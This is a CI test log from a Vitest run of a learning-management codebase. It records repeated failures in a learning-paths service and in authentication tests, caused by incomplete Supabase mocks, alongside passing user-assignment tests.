2025-11-18T17:35:44.6306394Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6308119Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6309571Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6311019Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:44.6312480Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:44.6313213Z 
2025-11-18T17:35:44.6315196Z [90mstderr[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mTime Tracking Calculations[2m > [22m[2mshould aggregate time correctly from multiple sources[22m[39m
2025-11-18T17:35:44.6317846Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function
2025-11-18T17:35:44.6319868Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:528:10[90m)[39m
2025-11-18T17:35:44.6321691Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/integration/learning-path-tracking-validation.test.ts:228:49
2025-11-18T17:35:44.6323243Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:135:14
2025-11-18T17:35:44.6324655Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:58:26
2025-11-18T17:35:44.6326672Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:17[90m)[39m
2025-11-18T17:35:44.6328763Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6330529Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6332267Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6334010Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:44.6335767Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:44.6336593Z 
2025-11-18T17:35:44.6338729Z [90mstderr[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mTime Tracking Calculations[2m > [22m[2mshould handle completed path time tracking[22m[39m
2025-11-18T17:35:44.6341297Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function
2025-11-18T17:35:44.6343403Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:528:10[90m)[39m
2025-11-18T17:35:44.6345189Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/integration/learning-path-tracking-validation.test.ts:262:49
2025-11-18T17:35:44.6346654Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:135:14
2025-11-18T17:35:44.6348241Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:58:26
2025-11-18T17:35:44.6349693Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:17[90m)[39m
2025-11-18T17:35:44.6351269Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6352851Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6354452Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6356060Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:44.6357904Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:44.6358690Z 
2025-11-18T17:35:44.6360833Z [90mstderr[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mData Structure Validation[2m > [22m[2mshould maintain consistent data structure across all scenarios[22m[39m
2025-11-18T17:35:44.6363393Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function
2025-11-18T17:35:44.6365449Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:528:10[90m)[39m
2025-11-18T17:35:44.6367521Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/integration/learning-path-tracking-validation.test.ts:295:51
2025-11-18T17:35:44.6369064Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:135:14
2025-11-18T17:35:44.6370694Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:58:26
2025-11-18T17:35:44.6372221Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:17[90m)[39m
2025-11-18T17:35:44.6373858Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6375520Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6377384Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6379177Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:44.6380884Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:44.6381661Z 
2025-11-18T17:35:44.6383842Z [90mstderr[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mError Handling Validation[2m > [22m[2mshould handle database errors gracefully[22m[39m
2025-11-18T17:35:44.6386265Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function
2025-11-18T17:35:44.6388553Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:528:10[90m)[39m
2025-11-18T17:35:44.6390320Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/integration/learning-path-tracking-validation.test.ts:324:30
2025-11-18T17:35:44.6391817Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:135:14
2025-11-18T17:35:44.6393214Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:58:26
2025-11-18T17:35:44.6394655Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:17[90m)[39m
2025-11-18T17:35:44.6396360Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6398240Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6399912Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6401584Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:44.6403252Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:44.6404026Z 
2025-11-18T17:35:44.6406007Z [90mstderr[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mError Handling Validation[2m > [22m[2mshould handle missing path gracefully[22m[39m
2025-11-18T17:35:44.6408793Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function
2025-11-18T17:35:44.6410933Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:528:10[90m)[39m
2025-11-18T17:35:44.6412802Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/integration/learning-path-tracking-validation.test.ts:335:30
2025-11-18T17:35:44.6414708Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:135:14
2025-11-18T17:35:44.6416260Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:58:26
2025-11-18T17:35:44.6418115Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:17[90m)[39m
2025-11-18T17:35:44.6419924Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6421660Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6423361Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6425059Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:44.6426750Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:44.6427886Z 
2025-11-18T17:35:44.6430372Z [90mstderr[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mPerformance Validation[2m > [22m[2mshould use efficient RPC call instead of multiple queries[22m[39m
2025-11-18T17:35:44.6433069Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function
2025-11-18T17:35:44.6435238Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:528:10[90m)[39m
2025-11-18T17:35:44.6437337Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/integration/learning-path-tracking-validation.test.ts:347:34
2025-11-18T17:35:44.6438978Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:135:14
2025-11-18T17:35:44.6440455Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:58:26
2025-11-18T17:35:44.6442093Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:17[90m)[39m
2025-11-18T17:35:44.6443855Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6445568Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6447552Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6449294Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:44.6451011Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:44.6451803Z 
2025-11-18T17:35:44.6452880Z [31m     → Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:35:44.6455601Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mProgress Calculation Accuracy[2m > [22mshould handle 100% completion correctly[39m
2025-11-18T17:35:44.6458244Z [31m     → Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:35:44.6460949Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mProgress Calculation Accuracy[2m > [22mshould handle zero progress correctly[39m
2025-11-18T17:35:44.6463637Z [31m     → Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:35:44.6466593Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mButton Text and Variants Validation[2m > [22mshould assign correct button text and variants based on course status[39m
2025-11-18T17:35:44.6469490Z [31m     → Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:35:44.6472377Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mTime Tracking Calculations[2m > [22mshould aggregate time correctly from multiple sources[39m
2025-11-18T17:35:44.6474976Z [31m     → Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:35:44.6478043Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mTime Tracking Calculations[2m > [22mshould handle completed path time tracking[39m
2025-11-18T17:35:44.6480852Z [31m     → Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:35:44.6483736Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mData Structure Validation[2m > [22mshould maintain consistent data structure across all scenarios[39m
2025-11-18T17:35:44.6486232Z [31m     → Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:35:44.6489143Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mError Handling Validation[2m > [22mshould handle database errors gracefully[39m
2025-11-18T17:35:44.6491818Z [31m     → expected [Function] to throw error including 'Failed to fetch learning path details…' but got 'Failed to fetch learning path details…'[39m
2025-11-18T17:35:44.6494637Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mError Handling Validation[2m > [22mshould handle missing path gracefully[39m
2025-11-18T17:35:44.6497449Z [31m     → expected [Function] to throw error including 'Learning path not found' but got 'Failed to fetch learning path details…'[39m
2025-11-18T17:35:44.6500306Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mPerformance Validation[2m > [22mshould use efficient RPC call instead of multiple queries[39m
2025-11-18T17:35:44.6502845Z [31m     → Failed to fetch learning path details: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function[39m
2025-11-18T17:35:44.6504003Z [90mstdout[2m | unknown test[22m[39m
2025-11-18T17:35:44.6504859Z ✅ Learning Path Tracking System validation tests completed
2025-11-18T17:35:44.6505302Z 
2025-11-18T17:35:44.6508015Z [90mstdout[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mProgress Calculation Accuracy[2m > [22m[2mshould correctly calculate progress percentages for different completion scenarios[22m[39m
2025-11-18T17:35:44.6510311Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:44.6510883Z 
2025-11-18T17:35:44.6513025Z [90mstdout[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mProgress Calculation Accuracy[2m > [22m[2mshould handle 100% completion correctly[22m[39m
2025-11-18T17:35:44.6515375Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:44.6515947Z 
2025-11-18T17:35:44.6518243Z [90mstdout[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mProgress Calculation Accuracy[2m > [22m[2mshould handle zero progress correctly[22m[39m
2025-11-18T17:35:44.6520251Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:44.6520821Z 
2025-11-18T17:35:44.6523237Z [90mstdout[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mButton Text and Variants Validation[2m > [22m[2mshould assign correct button text and variants based on course status[22m[39m
2025-11-18T17:35:44.6525408Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:44.6525960Z 
2025-11-18T17:35:44.6528315Z [90mstdout[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mTime Tracking Calculations[2m > [22m[2mshould aggregate time correctly from multiple sources[22m[39m
2025-11-18T17:35:44.6530582Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:44.6531154Z 
2025-11-18T17:35:44.6533319Z [90mstdout[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mTime Tracking Calculations[2m > [22m[2mshould handle completed path time tracking[22m[39m
2025-11-18T17:35:44.6535326Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:44.6535902Z 
2025-11-18T17:35:44.6538372Z [90mstdout[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mData Structure Validation[2m > [22m[2mshould maintain consistent data structure across all scenarios[22m[39m
2025-11-18T17:35:44.6540490Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:44.6541046Z 
2025-11-18T17:35:44.6543155Z [90mstdout[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mError Handling Validation[2m > [22m[2mshould handle database errors gracefully[22m[39m
2025-11-18T17:35:44.6545188Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:44.6545760Z 
2025-11-18T17:35:44.6548150Z [90mstdout[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mError Handling Validation[2m > [22m[2mshould handle missing path gracefully[22m[39m
2025-11-18T17:35:44.6550124Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:44.6550659Z 
2025-11-18T17:35:44.6552850Z [90mstdout[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mPerformance Validation[2m > [22m[2mshould use efficient RPC call instead of multiple queries[22m[39m
2025-11-18T17:35:44.6554888Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:44.6555468Z 
2025-11-18T17:35:45.0531845Z  [32m✓[39m lib/services/__tests__/userAssignments.test.ts [2m ([22m[2m10 tests[22m[2m)[22m[90m 16[2mms[22m[39m
2025-11-18T17:35:45.0538638Z [90mstdout[2m | lib/services/__tests__/userAssignments.test.ts[2m > [22m[2mUserAssignmentsService[2m > [22m[2mcreateCollaborativeSubmission - Validation[2m > [22m[2mshould reject if submitter already has a submission[22m[39m
2025-11-18T17:35:45.0545301Z [UserAssignments] Creating collaborative submission: {
2025-11-18T17:35:45.0546078Z   assignmentId: [32m'assignment-123'[39m,
2025-11-18T17:35:45.0546670Z   submitterId: [32m'user-123'[39m,
2025-11-18T17:35:45.0547365Z   sharedCount: [33m0[39m
2025-11-18T17:35:45.0547724Z }
2025-11-18T17:35:45.0547886Z 
2025-11-18T17:35:45.0549883Z [90mstdout[2m | lib/services/__tests__/userAssignments.test.ts[2m > [22m[2mUserAssignmentsService[2m > [22m[2mcreateCollaborativeSubmission - Validation[2m > [22m[2mshould reject if any shared user already has a submission[22m[39m
2025-11-18T17:35:45.0551652Z [UserAssignments] Creating collaborative submission: {
2025-11-18T17:35:45.0552354Z   assignmentId: [32m'assignment-123'[39m,
2025-11-18T17:35:45.0552928Z   submitterId: [32m'user-123'[39m,
2025-11-18T17:35:45.0553402Z   sharedCount: [33m1[39m
2025-11-18T17:35:45.0553750Z }
2025-11-18T17:35:45.0553905Z 
2025-11-18T17:35:45.0555586Z [90mstdout[2m | lib/services/__tests__/userAssignments.test.ts[2m > [22m[2mUserAssignmentsService[2m > [22m[2mgetAllUserAssignments[2m > [22m[2mshould return assignments from enrolled courses[22m[39m
2025-11-18T17:35:45.0557299Z [UserAssignments] Getting assignments for user: user-123
2025-11-18T17:35:45.0558340Z [UserAssignments] Found course IDs: [ [32m'course-1'[39m, [32m'course-2'[39m ]
2025-11-18T17:35:45.0559820Z [UserAssignments] Assignments query result: { count: [33m1[39m, error: [1mnull[22m }
2025-11-18T17:35:45.0560803Z [UserAssignments] Returning [33m1[39m assignments
2025-11-18T17:35:45.0561161Z 
2025-11-18T17:35:45.0562911Z [90mstdout[2m | lib/services/__tests__/userAssignments.test.ts[2m > [22m[2mUserAssignmentsService[2m > [22m[2mgetAllUserAssignments[2m > [22m[2mshould return empty array if user has no enrollments[22m[39m
2025-11-18T17:35:45.0564476Z [UserAssignments] Getting assignments for user: user-123
2025-11-18T17:35:45.0565158Z [UserAssignments] Student has no enrolled courses
2025-11-18T17:35:45.0565514Z 
2025-11-18T17:35:45.0567420Z [90mstdout[2m | lib/services/__tests__/userAssignments.test.ts[2m > [22m[2mUserAssignmentsService[2m > [22m[2mgetAllUserAssignments[2m > [22m[2mshould throw error if course_enrollments query fails[22m[39m
2025-11-18T17:35:45.0569051Z [UserAssignments] Getting assignments for user: user-123
2025-11-18T17:35:45.0569484Z 
2025-11-18T17:35:45.0571177Z [90mstdout[2m | lib/services/__tests__/userAssignments.test.ts[2m > [22m[2mUserAssignmentsService[2m > [22m[2mgetAllUserAssignments[2m > [22m[2mshould filter by active enrollment status[22m[39m
2025-11-18T17:35:45.0575325Z [UserAssignments] Getting assignments for user: user-123
2025-11-18T17:35:45.0576175Z [UserAssignments] Found course IDs: [ [32m'course-1'[39m ]
2025-11-18T17:35:45.0577317Z [UserAssignments] Assignments query result: { count: [33m0[39m, error: [1mnull[22m }
2025-11-18T17:35:45.0578211Z [UserAssignments] Returning [33m0[39m assignments
2025-11-18T17:35:45.0578542Z 
2025-11-18T17:35:45.0580254Z [90mstderr[2m | lib/services/__tests__/userAssignments.test.ts[2m > [22m[2mUserAssignmentsService[2m > [22m[2mgetAllUserAssignments[2m > [22m[2mshould throw error if course_enrollments query fails[22m[39m
2025-11-18T17:35:45.0582293Z [UserAssignments] Error fetching assignments: { message: [32m'relation "public.course_enrollments" does not exist'[39m }
2025-11-18T17:35:45.0583003Z 
2025-11-18T17:35:45.4532143Z  [33m❯[39m __tests__/auth/auth-fix-validation.test.tsx [2m ([22m[2m11 tests[22m [2m|[22m [31m11 failed[39m[2m)[22m[90m 15[2mms[22m[39m
2025-11-18T17:35:45.4535073Z [31m   [33m❯[31m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mNo Competing Listeners[2m > [22mAuthContext should not create its own onAuthStateChange listener[39m
2025-11-18T17:35:45.4537171Z [31m     → useSupabaseClient.mockReturnValue is not a function[39m
2025-11-18T17:35:45.4539411Z [31m   [33m❯[31m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mNo Competing Listeners[2m > [22mAuthContext should react to session changes from SessionContextProvider[39m
2025-11-18T17:35:45.4540901Z [31m     → useSupabaseClient.mockReturnValue is not a function[39m
2025-11-18T17:35:45.4542010Z [31m   [33m❯[31m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mSession Persistence[2m > [22mshould maintain session across component remounts[39m
2025-11-18T17:35:45.4542924Z [31m     → useSupabaseClient.mockReturnValue is not a function[39m
2025-11-18T17:35:45.4543982Z [31m   [33m❯[31m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mSession Persistence[2m > [22mshould handle session refresh without logout[39m
2025-11-18T17:35:45.4544846Z [31m     → useSupabaseClient.mockReturnValue is not a function[39m
2025-11-18T17:35:45.4545923Z [31m   [33m❯[31m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mRole-Based Authentication[2m > [22mshould authenticate admin role correctly[39m
2025-11-18T17:35:45.4547615Z [31m     → useSupabaseClient.mockReturnValue is not a function[39m
2025-11-18T17:35:45.4550118Z [31m   [33m❯[31m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mRole-Based Authentication[2m > [22mshould authenticate consultor role correctly[39m
2025-11-18T17:35:45.4551890Z [31m     → useSupabaseClient.mockReturnValue is not a function[39m
2025-11-18T17:35:45.4553863Z [31m   [33m❯[31m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mRole-Based Authentication[2m > [22mshould authenticate equipo_directivo role correctly[39m
2025-11-18T17:35:45.4555361Z [31m     → useSupabaseClient.mockReturnValue is not a function[39m
2025-11-18T17:35:45.4557554Z [31m   [33m❯[31m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mRole-Based Authentication[2m > [22mshould authenticate lider_generacion role correctly[39m
2025-11-18T17:35:45.4559141Z [31m     → useSupabaseClient.mockReturnValue is not a function[39m
2025-11-18T17:35:45.4561085Z [31m   [33m❯[31m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mRole-Based Authentication[2m > [22mshould authenticate lider_comunidad role correctly[39m
2025-11-18T17:35:45.4562629Z [31m     → useSupabaseClient.mockReturnValue is not a function[39m
2025-11-18T17:35:45.4564460Z [31m   [33m❯[31m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mRole-Based Authentication[2m > [22mshould authenticate docente role correctly[39m
2025-11-18T17:35:45.4565932Z [31m     → useSupabaseClient.mockReturnValue is not a function[39m
2025-11-18T17:35:45.4567918Z [31m   [33m❯[31m __tests__/auth/auth-fix-validation.test.tsx[2m > [22mAuthentication Fix Validation[2m > [22mLogout Functionality[2m > [22mshould clear session and redirect on logout[39m
2025-11-18T17:35:45.4569383Z [31m     → useSupabaseClient.mockReturnValue is not a function[39m
2025-11-18T17:35:46.1909538Z  [33m❯[39m e2e/tests/rbac-system.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:46.5850386Z [90mstderr[2m | __tests__/services/learningPathsService.spec.ts[2m > [22m[2mLearningPathsService[2m > [22m[2mgetLearningPathDetailsForUser[2m > [22m[2mshould return complete path details with progress when RPC succeeds[22m[39m
2025-11-18T17:35:46.5852819Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: assignmentQuery.maybeSingle is not a function
2025-11-18T17:35:46.5853989Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:549:82[90m)[39m
2025-11-18T17:35:46.5855188Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/services/learningPathsService.spec.ts:113:22
